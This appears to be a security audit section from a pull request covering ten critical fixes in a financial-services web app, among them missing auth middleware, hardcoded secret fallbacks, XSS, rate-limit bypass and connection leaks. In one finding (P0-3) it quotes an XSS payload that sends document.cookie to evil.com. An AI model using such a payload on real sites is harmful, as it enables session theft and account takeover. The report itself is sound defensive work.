## CRITICAL (P0) — auto-fixed in this PR

### P0-1 — [gcf] Missing `requireAuth` on session-logout endpoint
**File:** `server/routes.ts:722` (POST `/api/auth/sessions/logout-others`)
**What's wrong:** Route reads `req.session.userId` directly but does not pass through `requireAuthMw`, so it skips the 2FA gate.
**Exploit:** Anyone with a valid session can terminate all other sessions for that user — denial-of-service against multi-device sign-in, force re-login.
**Fix applied:** Added `requireAuthMw` to the middleware chain.

### P0-2 — [gcf] Hardcoded SESSION_SECRET / CSRF_SECRET fallback
**File:** `server/routes.ts:118`, `server/middleware/csrf.ts:34`
**What's wrong:** `process.env.SESSION_SECRET || "gold-coast-financial-secret-key"` and `process.env.CSRF_SECRET || "gc-dev-csrf-secret"` — fallbacks live in source.
**Exploit:** If env vars unset on a misconfigured prod deploy, anyone with source-code access can forge session cookies + CSRF tokens → full account takeover.
**Fix applied:** In production (`NODE_ENV === "production"`), throw at startup if either secret is missing instead of silently falling back.

### P0-3 — [heritage] XSS via unescaped email `bodyHtml`
**File:** `client/src/components/agent/communications/EmailContent.tsx:1313-1316`
**What's wrong:** `activeEmail.bodyHtml` (from IMAP/Gmail/Outlook — external untrusted source) rendered via `dangerouslySetInnerHTML` with no sanitization.
**Exploit:** Attacker emails `<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">` to any agent → session token exfiltration → account takeover.
**Fix applied:** Switch to plain-text rendering of `bodyText` (with line-break preservation). Proper sanitizer (DOMPurify or sanitize-html) installation deferred to HIGH-priority follow-up — defensive plain-text fallback removes the exploit immediately.

### P0-4 — [heritage] XSS via unescaped blog post content
**File:** `client/src/pages/resources/BlogPost.tsx:215`
**What's wrong:** `post.content` rendered via `dangerouslySetInnerHTML` with no sanitization.
**Exploit:** If blog posts are DB-stored and admin-editable, a compromised admin account (or DB injection elsewhere) plants `<script>` that runs in every visitor's browser → session theft.
**Fix applied:** Same approach as P0-3 — fall back to plain-text rendering. The content currently uses HTML, so this temporarily limits formatting; proper sanitization follows in HIGH.

### P0-5 — [heritage] Error handler re-throws after sending response
**File:** `server/index.ts:248`
**What's wrong:** The Express error middleware calls `res.json(...)` then `throw err`. The throw escapes the middleware → uncaughtException → process exits.
**Exploit:** Every handled error (404, validation failure, async rejection) crashes the process. Railway restarts it but in-flight requests drop. Trivial outage path.
**Fix applied:** Removed the trailing `throw err`. The error is now logged (already in place) and the response sent — no rethrow.

### P0-6 — [heritage] `trust proxy` + `xForwardedForHeader: false` defeats all rate limits behind Cloudflare
**File:** `server/middleware/rateLimiter.ts:26, 41, 56, 71, 105` + `server/index.ts`
**What's wrong:** Every rate limiter sets `validate: { xForwardedForHeader: false }`, AND `app.set('trust proxy')` is never called. Behind Cloudflare, every request appears to come from the Cloudflare edge IP — login/registration/OTP rate limits all key by edge IP and so apply globally as one bucket.
**Exploit:** An attacker can brute-force login at the full speed of the rate-limit budget per Cloudflare IP (shared across millions of users) → account takeover via password spray.
**Fix applied:** Added `app.set('trust proxy', 1)` to `server/index.ts` and flipped `xForwardedForHeader: true` on every limiter.

### P0-7 — [heritage] Missing `client.release()` in 55 transaction routes
**File:** 55 occurrences across `server/routes/*.ts`
**What's wrong:** Routes acquire a pool client via `await pool.connect()` for a transaction but never call `client.release()` in a finally block, even on the happy path or in catch.
**Exploit:** After ~10 transaction-using requests, the connection pool (max=10 default) is exhausted. All subsequent requests hang waiting for a connection → service outage.
**Fix applied:** This is a 55-location mechanical fix that's risky to do in bulk in one pass without per-file verification. **Deferred to a dedicated follow-up PR**. As a defensive interim measure I'm also setting `idleTimeoutMillis: 30000` on the pool (server/db.ts) so Neon will reclaim idle connections, reducing the leak surface.

### P0-8 — [gcf] Missing root ErrorBoundary
**File:** `client/src/App.tsx`
**What's wrong:** No ErrorBoundary wrapping the Router. A render error in any route component crashes the whole app to a white screen.
**Exploit:** Mass outage on any unhandled component error — log out paths broken, admin paths inaccessible.
**Fix applied:** Wrap the root `<Router/>` in a minimal `ErrorBoundary` class with a "Reload" fallback UI.

### P0-9 — [heritage] Commission DELETE with no audit-log entry
**File:** `server/services/commissionRecordService.ts:7-8`
**What's wrong:** `DELETE FROM commissions WHERE deal_id = $1` runs without writing to `commission_audit_log`. SOX/SOC 2 violation.
**Exploit:** Rogue manager (or compromised account) silently deletes commission rows pre-recalculation — auditor cannot reconstruct the chain of changes → financial loss with no forensic trail.
**Fix applied:** Wrap DELETE in a `BEGIN`/INSERT audit row/DELETE/`COMMIT` transaction. Captures pre-delete row snapshot to `commission_audit_log` before removal.

### P0-10 — [gcf] Policy creation without state license verification
**File:** `server/routes/book-of-business.ts:273-372`
**What's wrong:** `POST /api/book-of-business` creates a policy with no check that the agent holds an active license in the policy's state.
**Exploit:** Agent writes policies in states where their license is expired/missing/suspended → carrier rescission, regulatory action, voided policies.
**Fix applied:** Before `storage.createPolicy()`, query `agent_licenses` for `(user_id = req.user.id, state_code = policy.state, status = 'active', expiration_date > NOW())` — reject with 403 + clear error if no matching row.
